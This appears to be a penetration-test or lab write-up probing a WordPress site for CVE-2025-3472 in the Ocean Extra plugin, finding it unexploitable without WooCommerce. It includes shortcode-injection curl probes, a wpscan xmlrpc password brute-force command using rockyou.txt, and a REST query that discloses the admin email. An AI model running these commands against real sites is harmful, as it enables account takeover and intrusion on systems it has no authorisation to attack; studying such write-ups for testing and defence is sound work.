# Ocean-Extra Shortcode Investigation Results

**Date:** 2025-09-30
**Target:** alvida-eatery.org (192.168.229.47)

---

## CVE-2025-3472: UNAUTHENTICATED ARBITRARY SHORTCODE EXECUTION

### Vulnerability Details
- **Plugin:** Ocean Extra
- **Vulnerable Version:** <= 2.4.6
- **Target Version:** 2.0.1 ✅ **VULNERABLE**
- **Patched Version:** 2.4.7
- **CVSS Score:** 6.5 (Medium)
- **CVE:** CVE-2025-3472

### Requirements for Exploitation
1. ✅ Ocean Extra plugin installed (confirmed: v2.0.1)
2. ❌ **WooCommerce must be installed and activated** (NOT PRESENT)
3. Unauthenticated access to vulnerable endpoint

### Investigation Results

**WooCommerce Check:**
```bash
curl -s "http://alvida-eatery.org/shop/" -I
# Result: HTTP/1.1 404 Not Found

curl -s "http://alvida-eatery.org/cart/" -I  
# Result: HTTP/1.1 404 Not Found

curl -s "http://alvida-eatery.org/product/" -I
# Result: HTTP/1.1 404 Not Found
```

**Conclusion:** WooCommerce is NOT installed, therefore CVE-2025-3472 **CANNOT BE EXPLOITED**.

---

## Shortcode Processing Tests

### Test 1: URL Parameter Injection
```bash
curl "http://alvida-eatery.org/?test=[oceanwp_current_user]"
```
**Result:** Shortcode NOT executed in URL parameters

### Test 2: Search Parameter
```bash
curl "http://alvida-eatery.org/?s=[oceanwp_search]"
```
**Result:** Shortcode processed but only in page title (HTML-encoded), not executed

### Test 3: Documented Shortcodes Tested
- `[oceanwp_current_user]` - Not executed
- `[oceanwp_nav]` - Not executed  
- `[oceanwp_login]` - Not executed
- `[oceanwp_search]` - Not executed
- `[oceanwp_breadcrumb]` - Not executed

### Documented Ocean-Extra Shortcodes (from readme.txt)
```
[oceanwp_logo]
[oceanwp_nav]
[oceanwp_icon]
[oceanwp_breadcrumb]
[oceanwp_last_modified]
[oceanwp_current_user]
[oceanwp_woo_total_cart]       # Requires WooCommerce
[oceanwp_woo_cart_items]        # Requires WooCommerce
[oceanwp_woo_free_shipping_left] # Requires WooCommerce
[oceanwp_search]
[oceanwp_login]
```

---

## Why CVE-2025-3472 Failed

**From Wordfence:**
> "This makes it possible for unauthenticated attackers to execute arbitrary shortcodes **when WooCommerce is also installed and activated**."

**Root Cause:**
The vulnerable code path in Ocean Extra only processes shortcodes unsafely when WooCommerce hooks/actions are present. Without WooCommerce, the vulnerable endpoint is never reached.

---

## Remaining Attack Vectors

Since Ocean-Extra RCE is not exploitable, remaining options:

### 1. Password Attack (Rockyou)
```bash
# Extract rockyou.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Launch attack
wpscan --url http://alvida-eatery.org \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc \
  -t 50
```
**Time:** 4-8 hours  
**Success Rate:** Medium

### 2. Perfect Survey Alternate Exploits
- CVE-2021-24763: Unauthorised AJAX settings manipulation
- CVE-2021-24764: Reflected XSS
- CVE-2021-24765: Unauthenticated Stored XSS

### 3. Admin Email Disclosure (CVE-2023-5561)
```bash
curl -s "http://alvida-eatery.org/?rest_route=/wp/v2/users/1" | grep email
```

### 4. Directory Listing Enumeration
- Elementor: `/wp-content/plugins/elementor/`
- WPForms: `/wp-content/plugins/wpforms-lite/`

---

## Lessons Learned

1. **Always check prerequisites** - CVE may exist but environmental requirements matter
2. **WooCommerce dependency** - Many WordPress exploits require specific plugin combinations
3. **Shortcode execution context** - WordPress only processes shortcodes in specific locations (post content, widgets, etc.), not raw URL parameters
4. **Version vulnerable ≠ exploitable** - Software can be vulnerable but not exploitable in specific configurations

---

**Status:** CVE-2025-3472 exploitation **NOT POSSIBLE** without WooCommerce.  
**Recommendation:** Pivot to password attack or authenticated exploitation vectors.
